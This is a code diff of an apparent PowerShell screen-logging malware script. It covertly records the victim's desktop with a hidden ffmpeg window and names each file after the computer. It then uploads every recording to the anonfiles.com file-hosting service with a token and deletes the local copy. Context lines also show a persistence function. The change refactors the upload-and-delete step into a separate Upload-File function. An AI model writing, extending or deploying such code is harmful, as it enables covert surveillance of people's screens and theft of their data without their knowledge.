@@ -35,6 +35,21 @@ function Add-LoggerPersistency {
     }
 }
 
+function Upload-File{
+    [CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$True)]
+		[string]$path
+	);   
+     
+    $url="https://api.anonfiles.com/upload?token=$Anontoken";
+
+    if(Test-Path $path){
+        (New-Object System.Net.WebClient).UploadFile($url,$path) > $null | Wait-Process;
+        Remove-Item $path -Force;
+    }
+}
+
 function Start-Screenlogger{
     [CmdletBinding()]
     param
@@ -57,7 +72,6 @@ function Start-Screenlogger{
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
         $path = "$env:temp\screenlog-$env:computername-$time.mkv";
-        $url="https://api.anonfiles.com/upload?token=$Anontoken";
         $ffmpegArgs = @(
             "-f gdigrab",
             "-s 1280x720",
@@ -73,13 +87,9 @@ function Start-Screenlogger{
         );
 
         Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList "$ffmpegArgs" -Wait -WindowStyle hidden;
+        Upload-File $path;
         
-        if(Test-Path $path){
-            (New-Object System.Net.WebClient).UploadFile($url,$path) > $null | Wait-Process;
-            Remove-Item $path -Force;
-            Start-Sleep $Delay;
-        }
-        
+        Start-Sleep $Delay;
         $count++;
     }
 }
